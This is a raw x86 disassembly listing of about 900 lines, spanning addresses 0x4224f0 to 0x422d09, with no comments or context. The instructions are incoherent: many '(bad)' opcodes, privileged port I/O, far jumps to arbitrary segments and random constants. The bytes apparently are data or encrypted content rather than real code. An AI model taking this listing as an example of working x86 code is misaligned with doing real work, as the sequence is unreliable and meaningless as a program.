  4224f0:	idiv   BYTE PTR [edx+0x21]
  4224f3:	into   
  4224f4:	push   cs
  4224f5:	ret    0xb717
  4224f8:	mov    BYTE PTR [edx-0x68e06bee],al
  4224fe:	mov    ah,0x23
  422500:	xchg   ebx,eax
  422501:	mov    esi,0x7544ad7a
  422506:	jg     0x4224c6
  422508:	mov    DWORD PTR [esp+ebp*4+0x4e],esp
  42250c:	push   ds
  42250d:	mov    ecx,0x8563819
  422512:	pop    ds
  422513:	verr   WORD PTR [edx]
  422516:	pop    edx
  422517:	lods   al,BYTE PTR ds:[esi]
  422518:	es out dx,eax
  42251a:	xor    BYTE PTR [edi],bh
  42251c:	not    BYTE PTR [edi+ecx*1+0x1694259a]
  422523:	call   0xa515:0x334c27d0
  42252a:	mov    bl,0x29
  42252c:	mov    edx,0xbe82209e
  422531:	add    eax,0x27f86284
  422536:	sub    BYTE PTR [ecx],al
  422538:	loopne 0x422503
  42253a:	and    al,0xc5
  42253c:	pop    edx
  42253d:	inc    esp
  42253e:	and    edx,DWORD PTR [ebp+0x41]
  422541:	mov    ch,0x1f
  422543:	push   esp
  422544:	stos   BYTE PTR es:[edi],al
  422545:	jecxz  0x4225c3
  422547:	mov    edx,0xf65c7003
  42254c:	mov    ch,0x40
  42254e:	bound  ecx,QWORD PTR [ebx-0xe]
  422551:	push   0xb4d15afe
  422556:	dec    esi
  422557:	mov    eax,0x2c6d77e7
  42255c:	and    eax,DWORD PTR [ecx]
  42255e:	add    BYTE PTR ds:0x8f856922,dl
  422564:	popf   
  422565:	(bad)  
  422566:	jno    0x4225d1
  422568:	mov    cl,0x2e
  42256a:	jo     0x4225af
  42256c:	repz or ah,BYTE PTR ds:0xfca8db2
  422573:	mov    edx,ds
  422575:	fs or  esi,esp
  422578:	(bad)  
  422579:	sub    eax,0x3ada7597
  42257e:	lods   eax,DWORD PTR ds:[esi]
  42257f:	hlt    
  422580:	dec    ecx
  422581:	out    0x1a,al
  422583:	xchg   edx,eax
  422584:	xor    ebp,ebp
  422586:	stc    
  422587:	push   es
  422588:	mov    eax,ds:0x8909cd53
  42258d:	jbe    0x42253d
  42258f:	jns    0x4225cf
  422591:	sti    
  422592:	dec    esp
  422593:	pusha  
  422594:	cs daa 
  422596:	(bad)  
  422597:	jge    0x42259f
  422599:	and    dh,BYTE PTR [edi-0x108adf22]
  42259f:	inc    ebx
  4225a0:	cmp    al,0xb5
  4225a2:	hlt    
  4225a3:	iret   
  4225a4:	mov    DWORD PTR [ecx+0x7f3a57d1],eax
  4225aa:	fild   DWORD PTR [ebp+0x30]
  4225ad:	inc    ebp
  4225ae:	popa   
  4225af:	mov    ds:0x642bf73c,al
  4225b4:	(bad)  
  4225b5:	fdivr  QWORD PTR [edi+0x22]
  4225b8:	call   0x94452492
  4225bd:	retf   0x8bd2
  4225c0:	out    dx,al
  4225c1:	mov    ecx,0x2e72786e
  4225c6:	mov    BYTE PTR [ebx],bl
  4225c8:	mov    WORD PTR [esi+0x4e],es
  4225cb:	loope  0x42264a
  4225cd:	sar    BYTE PTR [ebx+0x70],cl
  4225d0:	lods   eax,DWORD PTR ss:[esi]
  4225d2:	rol    BYTE PTR [ebp-0x45ca4e42],0x3c
  4225d9:	mov    edi,0xf41856b2
  4225de:	scas   eax,DWORD PTR es:[edi]
  4225df:	pop    ebp
  4225e0:	push   eax
  4225e1:	(bad)  
  4225e2:	and    DWORD PTR [ebp-0x43],esi
  4225e5:	(bad)  
  4225e6:	jmp    0x422610
  4225e8:	push   ss
  4225e9:	stos   DWORD PTR es:[edi],eax
  4225ea:	push   0xffffffc5
  4225ec:	lea    edx,[ecx-0x76d76d17]
  4225f2:	push   eax
  4225f3:	mov    dl,ch
  4225f5:	iret   
  4225f6:	stc    
  4225f7:	jb     0x42263e
  4225f9:	out    0xb7,al
  4225fb:	jp     0x42263c
  4225fd:	stos   BYTE PTR es:[edi],al
  4225fe:	scas   eax,DWORD PTR es:[edi]
  4225ff:	lods   al,BYTE PTR ds:[esi]
  422600:	popf   
  422601:	int3   
  422602:	arpl   WORD PTR [edi],cx
  422604:	and    al,0xb8
  422606:	jl     0x422597
  422608:	loop   0x42261d
  42260a:	mov    edx,0x706feb25
  42260f:	ficomp WORD PTR [edx]
  422611:	mov    WORD PTR [ebx-0x2f491281],ss
  422617:	into   
  422618:	in     al,dx
  422619:	leave  
  42261a:	add    BYTE PTR [eax],al
  42261c:	mov    dh,0xdf
  42261e:	fwait
  42261f:	add    bh,bl
  422621:	inc    esi
  422622:	mov    edi,0x5e25f0ff
  422627:	and    eax,0x77630dd2
  42262c:	push   cs
  42262d:	mov    eax,ds:0x2860001
  422632:	add    BYTE PTR [eax],al
  422634:	cmp    eax,0xccb65d2d
  422639:	pop    ds
  42263a:	loope  0x4226a5
  42263c:	cmp    al,0x9c
  42263e:	popf   
  42263f:	data16 xchg BYTE PTR [ecx-0xa91bda7],dl
  422646:	mov    bh,BYTE PTR [ecx]
  422648:	out    0x25,al
  42264a:	adc    al,0xe
  42264c:	inc    eax
  42264d:	nop
  42264e:	out    dx,al
  42264f:	cmp    DWORD PTR [edx-0x5f],ebp
  422652:	mov    dh,0x39
  422654:	adc    DWORD PTR [esi-0x378c3ea5],edx
  42265a:	push   cs
  42265b:	or     BYTE PTR [ecx+0x19],0x23
  42265f:	xor    al,0xd
  422661:	push   esp
  422662:	ret    
  422663:	data16 hlt 
  422665:	fidiv  DWORD PTR [ebp+0x4507b5d9]
  42266b:	xchg   edi,eax
  42266c:	or     al,0x41
  42266e:	(bad)  
  42266f:	push   0x12
  422671:	add    DWORD PTR [edx-0x26],0xc6d7d4a8
  422678:	addr16 cmp eax,0x61a0bb3d
  42267e:	aas    
  42267f:	jmp    0x422603
  422681:	push   0xfffffff1
  422683:	push   ebp
  422684:	xor    BYTE PTR [ebp-0x4f9ccde2],dh
  42268a:	je     0x422671
  42268c:	test   BYTE PTR [esp+ecx*4-0x446dde85],bl
  422693:	ins    DWORD PTR es:[edi],dx
  422694:	icebp  
  422695:	xchg   BYTE PTR [eax+ebp*2],bl
  422698:	daa    
  422699:	retf   
  42269a:	sbb    al,0xaf
  42269c:	xchg   ebx,eax
  42269d:	fcmovnb st,st(0)
  42269f:	pop    ds
  4226a0:	push   0xd531d713
  4226a5:	jle    0x422636
  4226a7:	jno    0x422631
  4226a9:	and    edx,esp
  4226ab:	rcl    DWORD PTR [eax+0x6],cl
  4226ae:	aad    0x3a
  4226b0:	leave  
  4226b1:	out    dx,al
  4226b2:	mov    ecx,DWORD PTR [esi]
  4226b4:	mov    dh,0xec
  4226b6:	ficom  WORD PTR [esi]
  4226b8:	stos   BYTE PTR es:[edi],al
  4226b9:	aas    
  4226ba:	mov    ch,0x44
  4226bc:	rcl    BYTE PTR [edx-0x742d34f0],cl
  4226c2:	pushf  
  4226c3:	das    
  4226c4:	or     al,0x5a
  4226c6:	loope  0x4226ec
  4226c8:	sahf   
  4226c9:	and    ebx,ecx
  4226cb:	push   ds
  4226cc:	je     0x4226d1
  4226ce:	mov    esp,DWORD PTR [edx]
  4226d0:	xchg   DWORD PTR [ecx-0x64],esi
  4226d3:	dec    esp
  4226d4:	ficomp DWORD PTR [edx]
  4226d6:	inc    edx
  4226d7:	retf   0x5cfe
  4226da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4226db:	push   es
  4226dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4226dd:	ds push 0xbb127268
  4226e3:	jmp    0x422733
  4226e5:	pusha  
  4226e6:	rcl    dl,cl
  4226e8:	ds add cl,cl
  4226eb:	int3   
  4226ec:	stos   BYTE PTR es:[edi],al
  4226ed:	mov    al,ds:0xc8b567bd
  4226f2:	mov    al,0xf6
  4226f4:	push   ds
  4226f5:	mov    DWORD PTR [eax],ebp
  4226f7:	fs inc edi
  4226f9:	mov    bh,0x10
  4226fb:	mov    si,0x6892
  4226ff:	mov    dh,0x2b
  422701:	lock and edx,DWORD PTR [esi]
  422704:	or     ebx,esi
  422706:	xchg   al,ah
  422708:	pop    esi
  422709:	inc    edx
  42270a:	xchg   esp,eax
  42270b:	or     ch,al
  42270d:	ins    BYTE PTR es:[edi],dx
  42270e:	cli    
  42270f:	bound  ecx,QWORD PTR ss:[edx+0x7307e6ca]
  422716:	xor    DWORD PTR [esi-0xb],ebx
  422719:	test   DWORD PTR [ebx-0x512f10bf],0x4775141d
  422723:	cs jle 0x42272d
  422726:	aam    0xf
  422728:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422729:	cld    
  42272a:	mov    bh,0x6a
  42272c:	pop    eax
  42272d:	or     BYTE PTR [ebx-0x2f],bh
  422730:	jmp    0x422725
  422732:	retf   
  422733:	clc    
  422734:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422735:	jne    0x42279c
  422737:	mov    bh,0x2d
  422739:	not    BYTE PTR [esi]
  42273b:	dec    ecx
  42273c:	push   esp
  42273d:	xor    ch,BYTE PTR [ecx+0x6c7fb801]
  422743:	cmp    esp,ebx
  422745:	xor    al,0xef
  422747:	mov    DWORD PTR ds:0x41fe69ab,edi
  42274d:	out    dx,eax
  42274e:	pop    DWORD PTR [esi]
  422750:	push   ds
  422751:	xor    ah,ch
  422753:	lock pop esi
  422755:	in     eax,dx
  422756:	or     eax,0xdee456f9
  42275b:	sub    cl,BYTE PTR [edi]
  42275d:	iret   
  42275e:	or     BYTE PTR [edi-0x36499c65],dh
  422764:	loopne 0x42273d
  422766:	pop    ecx
  422767:	inc    edx
  422768:	xchg   ebx,eax
  422769:	in     eax,dx
  42276a:	movd   mm5,eax
  42276d:	push   ebx
  42276e:	and    ch,BYTE PTR [edx-0x3b]
  422771:	sbb    esi,DWORD PTR [edi]
  422773:	sbb    dh,al
  422775:	mov    eax,ds:0x5eff8fdd
  42277a:	add    dh,BYTE PTR [eax]
  42277c:	out    dx,al
  42277d:	cmp    BYTE PTR [ebp+0x2f],bh
  422780:	mov    eax,0xeccc8223
  422785:	aam    0xb1
  422787:	sbb    BYTE PTR [ebx+0x538ae107],dh
  42278d:	lea    eax,ds:0x1af6d32b
  422793:	mov    al,ds:0xf73870a
  422798:	loopne 0x42275a
  42279a:	aas    
  42279b:	adc    ebp,DWORD PTR [ecx-0x5eee3761]
  4227a1:	clc    
  4227a2:	jl     0x422815
  4227a4:	mov    edx,0x25c4209f
  4227a9:	mov    ebx,es
  4227ab:	dec    ecx
  4227ac:	add    eax,0xaa91181
  4227b1:	jne    0x42282a
  4227b3:	ja     0x42279d
  4227b5:	xchg   BYTE PTR ds:0x8e7b590c,cl
  4227bb:	sub    DWORD PTR [edx],eax
  4227bd:	out    0xcc,eax
  4227bf:	in     eax,0xe8
  4227c1:	dec    ecx
  4227c2:	pop    eax
  4227c3:	fild   QWORD PTR [edi+0x17]
  4227c6:	cdq    
  4227c7:	in     al,0xdd
  4227c9:	les    edx,FWORD PTR [ebx-0x1d03bd66]
  4227cf:	ficomp DWORD PTR [edx-0x7c]
  4227d2:	ins    BYTE PTR es:[edi],dx
  4227d3:	adc    esi,edi
  4227d5:	xor    dh,BYTE PTR [ecx+eiz*8-0x66]
  4227d9:	test   DWORD PTR [ecx-0x7e],0x3c71cc7
  4227e0:	fisub  DWORD PTR [edx-0x19]
  4227e3:	mov    eax,DWORD PTR [eax+0x7d]
  4227e6:	jmp    0x11cef6e6
  4227eb:	dec    edi
  4227ec:	(bad)  
  4227ed:	adc    eax,0xeb32915e
  4227f2:	push   ss
  4227f3:	mov    ch,0xf
  4227f5:	jbe    0x4227ea
  4227f7:	inc    edi
  4227f8:	js     0x422865
  4227fa:	pop    edx
  4227fb:	mov    dl,0xaf
  4227fd:	push   esp
  4227fe:	mov    dl,0x9c
  422800:	cmp    al,0xbe
  422802:	dec    ebp
  422803:	fstp   DWORD PTR [edx-0x6c]
  422806:	fcmovb st,st(3)
  422808:	jae    0x4227ac
  42280a:	shl    ecx,cl
  42280c:	call   0xe539:0x8101517c
  422813:	and    edi,esi
  422815:	fnsave [esi+0x36326e6]
  42281b:	lods   al,BYTE PTR ds:[esi]
  42281d:	dec    ebx
  42281e:	or     ecx,DWORD PTR [ebp-0x4a359691]
  422824:	mov    ah,0xdc
  422826:	int3   
  422827:	xchg   edi,eax
  422828:	jb     0x42289b
  42282a:	pusha  
  42282b:	(bad)  
  42282c:	pusha  
  42282d:	mov    ebp,0x9290af0c
  422832:	and    BYTE PTR [ecx+0x537e6a96],bl
  422838:	mov    ah,0x4f
  42283a:	aas    
  42283b:	push   ecx
  42283c:	popa   
  42283d:	in     al,0xbc
  42283f:	rol    DWORD PTR ds:0x2b66fe92,cl
  422845:	repnz inc esi
  422847:	bound  esi,QWORD PTR ss:[ebx+0x75]
  42284b:	sbb    eax,0x63743e79
  422850:	cs mov esp,0xeb1362a8
  422856:	sti    
  422857:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422858:	loop   0x4227fc
  42285a:	inc    ebx
  42285b:	push   es
  42285c:	cmp    eax,esp
  42285e:	xor    DWORD PTR [ebp+0x5e07f26d],esp
  422864:	inc    esp
  422865:	not    DWORD PTR [eax-0x13c6844d]
  42286b:	test   BYTE PTR cs:[edi-0x28],bh
  42286f:	sbb    al,0xfa
  422871:	jne    0x422820
  422873:	sbb    al,0x9
  422875:	scas   al,BYTE PTR es:[edi]
  422876:	jl     0x422873
  422878:	inc    edx
  422879:	mov    ds:0xe00c114e,eax
  42287e:	adc    eax,0x66feb921
  422883:	mov    dh,0x9c
  422885:	call   0x8461:0xc2955412
  42288c:	cdq    
  42288d:	jle    0x42287b
  42288f:	or     al,0x22
  422891:	push   ss
  422892:	sub    al,ch
  422894:	stos   BYTE PTR es:[edi],al
  422895:	cmc    
  422896:	repz rcr DWORD PTR [ebp+0x54],cl
  42289a:	adc    esi,DWORD PTR [ecx]
  42289c:	imul   BYTE PTR [esi-0x6ff2b04]
  4228a2:	xlat   BYTE PTR ds:[ebx]
  4228a3:	cli    
  4228a4:	push   esp
  4228a5:	sub    dl,bl
  4228a7:	mov    edi,0x8fab140a
  4228ac:	push   cs
  4228ad:	sub    BYTE PTR [edi],0x94
  4228b0:	sbb    eax,0x70544401
  4228b5:	jge    0x4228ff
  4228b7:	bswap  ebp
  4228b9:	or     al,0x0
  4228bb:	add    al,bh
  4228bd:	mov    ah,0x7f
  4228bf:	cmp    eax,0xf5faff7f
  4228c4:	jle    0x4228c8
  4228c6:	xor    eax,DWORD PTR [esi-0x49]
  4228c9:	les    edi,FWORD PTR [edi+0x1a39441]
  4228cf:	add    BYTE PTR [esi-0x1ffffffe],al
  4228d5:	in     al,dx
  4228d6:	call   0x4f8e9771
  4228db:	cli    
  4228dc:	sub    DWORD PTR [edx],edi
  4228de:	cs sti 
  4228e0:	gs js  0x422956
  4228e3:	ds jns 0x4228a2
  4228e6:	or     dl,BYTE PTR [eax-0x68bf583c]
  4228ec:	add    ecx,DWORD PTR [edi]
  4228ee:	jo     0x422917
  4228f0:	inc    ecx
  4228f1:	mov    ds:0x3c3ce3f2,al
  4228f6:	(bad)  
  4228f7:	xchg   ebp,eax
  4228f8:	xchg   ecx,eax
  4228f9:	push   edi
  4228fa:	sbb    eax,0xf91d9e1a
  4228ff:	pop    ds
  422900:	or     bh,bl
  422902:	push   esi
  422903:	scas   eax,DWORD PTR es:[edi]
  422904:	int    0x1e
  422906:	sub    BYTE PTR [eax-0x22918d88],bl
  42290c:	pop    eax
  42290d:	retf   0x4e60
  422910:	xor    al,0x53
  422912:	and    BYTE PTR [ebp-0x27],bh
  422915:	xor    bl,BYTE PTR [eax+0x6cce4f33]
  42291b:	lods   al,BYTE PTR ds:[esi]
  42291c:	inc    BYTE PTR [edx+0x61dbf337]
  422922:	push   ecx
  422923:	add    DWORD PTR [edi],0xc130034c
  422929:	fiadd  DWORD PTR [eax+0x2d6f975d]
  42292f:	out    dx,eax
  422930:	sahf   
  422931:	out    0x2,al
  422933:	and    ebx,ecx
  422935:	dec    edi
  422936:	xchg   ecx,eax
  422937:	or     eax,0xb0709e95
  42293c:	add    al,0x85
  42293e:	shr    DWORD PTR [edi+0x36],0xd1
  422942:	push   0xa2e8984e
  422947:	es ins DWORD PTR es:[edi],dx
  422949:	push   0xffffffc5
  42294b:	out    0x3b,al
  42294d:	call   0xc764:0x32512d25
  422954:	add    eax,DWORD PTR [eax-0x6b]
  422957:	mov    al,0x69
  422959:	adc    eax,0x66f8887d
  42295e:	xor    ebx,0xffffffc9
  422961:	fsubp  st(1),st
  422963:	dec    esi
  422964:	ret    0xbe47
  422967:	adc    ah,BYTE PTR [ebx]
  422969:	jbe    0x42291d
  42296b:	not    DWORD PTR [esp+ebp*4]
  42296e:	enter  0xcd4,0x1a
  422972:	imul   ebx,DWORD PTR [ecx],0x4764dbc9
  422978:	test   al,0x95
  42297a:	jp     0x42297a
  42297c:	fwait
  42297d:	xor    cl,cl
  42297f:	sbb    ah,cl
  422981:	aas    
  422982:	sub    DWORD PTR [ecx+ebx*1],0xb81d4a8
  422989:	inc    ebp
  42298a:	sbb    dl,BYTE PTR ds:0xfdc39251
  422990:	icebp  
  422991:	mov    esi,0x41f5248e
  422996:	fcomp  DWORD PTR [edi]
  422998:	jb     0x4229fc
  42299a:	push   ds
  42299b:	retf   
  42299c:	je     0x422955
  42299e:	sbb    ecx,DWORD PTR [eax+0xf1f7174]
  4229a4:	and    eax,0x45373292
  4229a9:	in     eax,0xa1
  4229ab:	adc    edi,DWORD PTR [esp+ecx*1-0x32cd9036]
  4229b2:	pop    edx
  4229b3:	jae    0x4229bb
  4229b5:	adc    BYTE PTR [edx-0x4d],bl
  4229b8:	out    dx,al
  4229b9:	in     eax,dx
  4229ba:	mov    ebp,0xa3cefe89
  4229bf:	pop    ebx
  4229c0:	fldenv [eax+eax*2+0x4704621c]
  4229c7:	dec    ecx
  4229c8:	dec    esi
  4229c9:	inc    edx
  4229ca:	imul   BYTE PTR [edi]
  4229cc:	rcr    BYTE PTR [eax+0x6eb022c9],0x6f
  4229d3:	not    BYTE PTR [edi-0x6ebd8605]
  4229d9:	xor    al,0xb1
  4229db:	add    eax,0xe9515ad7
  4229e0:	jno    0x422992
  4229e2:	rcl    BYTE PTR [esi-0x5b510bd7],1
  4229e8:	retf   
  4229e9:	fidiv  WORD PTR [ebx+0x7d]
  4229ec:	frstor [ebp+0x1221806a]
  4229f2:	test   eax,0x369fbfe8
  4229f7:	sbb    ebx,esi
  4229f9:	sbb    DWORD PTR [edx+0x3a],eax
  4229fc:	inc    esi
  4229fd:	adc    cl,al
  4229ff:	lahf   
  422a00:	mov    ecx,0x69634a80
  422a05:	repz arpl bp,cx
  422a08:	sub    dl,bh
  422a0a:	retf   
  422a0b:	rcl    BYTE PTR [ebx-0x3c80ef09],1
  422a11:	not    DWORD PTR [ebx-0x2b1a4983]
  422a17:	jp     0x422a1a
  422a19:	xchg   esp,eax
  422a1a:	nop
  422a1b:	retf   0xadf9
  422a1e:	mov    ah,BYTE PTR [eax-0x1e85c75a]
  422a24:	xchg   ebp,eax
  422a25:	hlt    
  422a26:	test   BYTE PTR es:[esi],0x7
  422a2a:	xor    DWORD PTR ss:0xf5476a9d,esp
  422a31:	or     DWORD PTR [esp+edi*2-0x2027b28b],ecx
  422a38:	mov    eax,ds:0x43af333e
  422a3d:	int3   
  422a3e:	or     dl,BYTE PTR [ecx-0x41]
  422a41:	inc    eax
  422a42:	addr16 into 
  422a44:	repnz fnstcw WORD PTR [ebx-0x1d3bc789]
  422a4b:	push   ecx
  422a4c:	int3   
  422a4d:	lods   al,BYTE PTR ds:[esi]
  422a4e:	push   0xf886cc90
  422a53:	dec    esi
  422a54:	push   ebx
  422a55:	dec    ebp
  422a56:	mov    BYTE PTR [edx+0xe],dl
  422a59:	mov    edx,0xebe2caca
  422a5e:	mov    ds:0x1d671102,eax
  422a63:	jne    0x422ade
  422a65:	popf   
  422a66:	add    ah,bl
  422a68:	inc    ecx
  422a69:	loope  0x422a22
  422a6b:	(bad)  
  422a6c:	or     eax,0xeb8ed839
  422a71:	out    dx,eax
  422a72:	xchg   BYTE PTR [edx-0x7f],al
  422a75:	jns    0x422ada
  422a77:	push   ss
  422a78:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422a79:	push   0x49b0a20d
  422a7e:	shr    BYTE PTR [ebx],1
  422a80:	out    dx,al
  422a81:	adc    DWORD PTR [ecx+0x61],ecx
  422a84:	ret    
  422a85:	call   0xab36:0x25f565e7
  422a8c:	add    eax,0xb40c619
  422a91:	sbb    eax,0x459a7143
  422a96:	pusha  
  422a97:	mov    ds:0x9d72ce99,al
  422a9c:	retf   
  422a9d:	aad    0x6
  422a9f:	push   ebp
  422aa0:	pop    ss
  422aa1:	adc    eax,0x42b09a9d
  422aa6:	aaa    
  422aa7:	scas   eax,DWORD PTR es:[edi]
  422aa8:	sub    DWORD PTR [edi+0x47],ebp
  422aab:	cmp    esi,DWORD PTR [ebp-0x55]
  422aae:	sbb    DWORD PTR [edx+ecx*4-0x524f31cb],eax
  422ab5:	xchg   bl,cl
  422ab7:	xor    eax,0x20059c75
  422abc:	(bad)  
  422abe:	pop    es
  422abf:	xor    al,0xf8
  422ac1:	lock mov eax,ds:0x872a50f1
  422ac7:	into   
  422ac8:	adc    DWORD PTR [edx],esi
  422aca:	rcl    DWORD PTR [esi+0x3c],1
  422acd:	or     dl,BYTE PTR [esp+edi*2-0x1]
  422ad1:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  422ad3:	hlt    
  422ad4:	inc    ebx
  422ad5:	fidiv  WORD PTR [esi+ecx*2-0x3e]
  422ad9:	jmp    0x4df9:0x9902a24a
  422ae0:	sbb    eax,0xe3658c8d
  422ae5:	iret   
  422ae6:	fisubr WORD PTR [ebp+0x75]
  422ae9:	mov    bh,0xa8
  422aeb:	data16 and al,BYTE PTR [esi+0xd8b6366]
  422af2:	xchg   BYTE PTR [edx],cl
  422af4:	popf   
  422af5:	dec    ecx
  422af7:	jmp    0xbfcb842c
  422afc:	mov    ebx,0xbc73907
  422b01:	aaa    
  422b02:	xchg   BYTE PTR [ecx+0x7498eeb8],ch
  422b08:	mov    ah,BYTE PTR [edx]
  422b0a:	push   esi
  422b0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422b0c:	sub    eax,0x9e2878f5
  422b11:	inc    edx
  422b12:	pop    edx
  422b13:	push   0x70
  422b15:	fidiv  WORD PTR [esi]
  422b17:	rcl    BYTE PTR [edx],0xbb
  422b1a:	mov    BYTE PTR [ebx+esi*4],ah
  422b1d:	push   ds
  422b1e:	aam    0x1b
  422b20:	scas   al,BYTE PTR es:[edi]
  422b21:	push   esi
  422b22:	sbb    esi,ebp
  422b24:	mov    ds:0xd390d3d1,eax
  422b29:	ins    BYTE PTR es:[edi],dx
  422b2a:	jno    0x422b36
  422b2c:	pop    edx
  422b2d:	pop    edi
  422b2e:	je     0x422b0c
  422b30:	call   0x5f8c0056
  422b35:	jecxz  0x422ac2
  422b37:	pop    ebp
  422b38:	shr    DWORD PTR ds:0x1d77841a,0xd0
  422b3f:	imul   esi,DWORD PTR [edi+0x21],0x2dafedd6
  422b46:	and    al,0xd7
  422b48:	jp     0x422b9b
  422b4a:	xchg   edx,eax
  422b4b:	es cmp eax,0xd2f87b
  422b51:	fistp  QWORD PTR [ebx]
  422b53:	xor    edx,0x26
  422b56:	inc    esp
  422b57:	jne    0x422adc
  422b59:	add    BYTE PTR cs:[eax],al
  422b5c:	cmp    DWORD PTR [ecx+ecx*4],ebx
  422b5f:	out    0xad,eax
  422b61:	idiv   DWORD PTR [edi-0x22]
  422b64:	mov    DWORD PTR [edx+0x79],ebp
  422b67:	sub    edx,0x1a3f780a
  422b6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422b6e:	add    DWORD PTR [eax],eax
  422b70:	xchg   BYTE PTR [edx],al
  422b72:	add    BYTE PTR [eax],al
  422b74:	jb     0x422b03
  422b76:	mov    DWORD PTR [edx-0x5d2ccef6],edx
  422b7c:	std    
  422b7d:	xor    eax,0xb59d5f57
  422b82:	mov    edi,0x13402592
  422b87:	sbb    DWORD PTR [ebp+0x52],0x29
  422b8b:	int3   
  422b8c:	mov    DWORD PTR [eax-0x62],ebx
  422b8f:	repz jge 0x422b60
  422b92:	out    dx,al
  422b93:	lods   al,BYTE PTR ds:[esi]
  422b94:	cmovns ebp,DWORD PTR [edx+0x45ce4ce6]
  422b9b:	cwde   
  422b9c:	inc    esi
  422b9d:	aas    
  422b9e:	into   
  422b9f:	(bad)  
  422ba0:	fld1   
  422ba2:	lea    esi,[esi+0x63666a79]
  422ba8:	les    ebx,FWORD PTR [esi+0x7bb4]
  422bae:	mov    DWORD PTR [ebx+eax*8-0xfb70f38],ebx
  422bb5:	shrd   esp,ebp,0x91
  422bb9:	loopne 0x422b3e
  422bbb:	call   0xa9e4f543
  422bc0:	jne    0x422b95
  422bc2:	inc    esi
  422bc3:	cmp    DWORD PTR [edi+0x5c],eax
  422bc6:	inc    ebx
  422bc7:	call   0xa4f8f098
  422bcc:	and    al,0x47
  422bce:	sub    al,0x3f
  422bd0:	inc    ebx
  422bd1:	leave  
  422bd2:	mov    esp,0x4c41bdf6
  422bd7:	adc    al,0xac
  422bd9:	shl    BYTE PTR cs:[ecx],0xaa
  422bdd:	mov    dh,0xd0
  422bdf:	jmp    0xec2:0xc57b2654
  422be6:	rcl    BYTE PTR [ecx],0xb8
  422be9:	outs   dx,DWORD PTR ds:[esi]
  422bea:	hlt    
  422beb:	push   cs
  422bec:	fidivr WORD PTR [edi-0x52d85407]
  422bf2:	loop   0x422b88
  422bf4:	jp     0x422b85
  422bf6:	cmp    edi,DWORD PTR [eax]
  422bf8:	sti    
  422bf9:	sub    BYTE PTR [edi+0x2a054600],cl
  422bff:	mov    edi,0x9fec444c
  422c04:	stos   DWORD PTR es:[edi],eax
  422c05:	(bad)  
  422c06:	and    DWORD PTR [edx+0x73],ecx
  422c09:	dec    edi
  422c0a:	sbb    edi,DWORD PTR [esi+edx*4-0x459dad77]
  422c11:	or     DWORD PTR [edi],edi
  422c13:	inc    edx
  422c14:	test   al,0xf0
  422c16:	cwde   
  422c17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422c18:	adc    al,0x3d
  422c1a:	jmp    0xb7e64bfc
  422c1f:	cmp    ch,BYTE PTR [edi-0x62797918]
  422c25:	add    al,0xda
  422c27:	mov    dh,0xd1
  422c29:	mov    al,ds:0x3da13837
  422c2e:	fistp  DWORD PTR [edi-0x69]
  422c31:	inc    ecx
  422c32:	ins    BYTE PTR es:[di],dx
  422c34:	push   ss
  422c35:	add    dl,BYTE PTR [edi+0x75b1c3b1]
  422c3b:	sbb    ebx,edi
  422c3d:	push   es
  422c3e:	nop
  422c3f:	mov    eax,ds:0x67712807
  422c44:	mov    edx,0xc04ba0ac
  422c49:	jns    0x422c1d
  422c4b:	loope  0x422c1d
  422c4d:	push   ss
  422c4e:	bound  eax,QWORD PTR [esi-0x326a82c2]
  422c54:	sub    BYTE PTR [ecx+0x46199888],0x74
  422c5b:	in     eax,0x88
  422c5d:	js     0x422c4e
  422c5f:	dec    esp
  422c60:	(bad)  
  422c61:	out    0x1c,eax
  422c63:	mov    ebx,0x5d9a1764
  422c68:	add    ebx,DWORD PTR [eax-0x30]
  422c6b:	jb     0x422c1c
  422c6d:	iret   
  422c6e:	add    ecx,DWORD PTR [ebx-0x630e2583]
  422c74:	add    dl,BYTE PTR [eax]
  422c76:	add    edx,DWORD PTR [edi+0x13210909]
  422c7c:	iret   
  422c7d:	frstor [ecx-0x4e03fd9b]
  422c83:	jmp    0x3a68:0xd19e77a9
  422c8a:	mov    al,ds:0xe4f534f2
  422c8f:	jg     0x422c9e
  422c91:	(bad)  
  422c92:	cmp    al,0x65
  422c94:	pop    edi
  422c95:	xchg   esp,eax
  422c96:	and    DWORD PTR [eax+eiz*1-0x8],ebx
  422c9a:	lods   eax,DWORD PTR ds:[esi]
  422c9b:	enter  0xbc7f,0x87
  422c9f:	fwait
  422ca0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422ca1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422ca2:	mul    BYTE PTR [eax+esi*2+0x637abbb5]
  422ca9:	jge    0x422c2e
  422cab:	repz daa 
  422cad:	out    dx,eax
  422cae:	and    BYTE PTR [esi+ecx*8-0x4138099d],cl
  422cb5:	and    eax,DWORD PTR [esi+0x430b84bc]
  422cbb:	xor    ecx,DWORD PTR [ecx+0x28]
  422cbe:	jge    0x422d38
  422cc0:	mov    bl,0xa
  422cc2:	mov    esp,0x5339ac4c
  422cc7:	loopne 0x422ce3
  422cc9:	scas   al,BYTE PTR es:[edi]
  422cca:	mov    esi,0xd350a63b
  422ccf:	sub    bl,bh
  422cd1:	sub    eax,0x77cb4cba
  422cd6:	cmp    dh,BYTE PTR [ebx*4-0x283ba7bf]
  422cdd:	dec    edi
  422cde:	call   0x7068:0x924a9905
  422ce5:	mov    dl,ah
  422ce7:	retf   
  422ce8:	out    dx,al
  422ce9:	jle    0x422cae
  422ceb:	mov    ch,dh
  422ced:	pop    ecx
  422cee:	sub    bh,BYTE PTR [ecx-0x80]
  422cf1:	es push eax
  422cf3:	jns    0x422cb7
  422cf5:	mov    ch,0x37
  422cf7:	arpl   WORD PTR [ebx],dx
  422cf9:	ret    0x992
  422cfc:	sub    ebp,0xffffffd7
  422cff:	in     eax,dx
  422d00:	sbb    cl,BYTE PTR [ebx+0x5806ebc]
  422d06:	jmp    0x422d16
  422d08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d09:	push   ecx
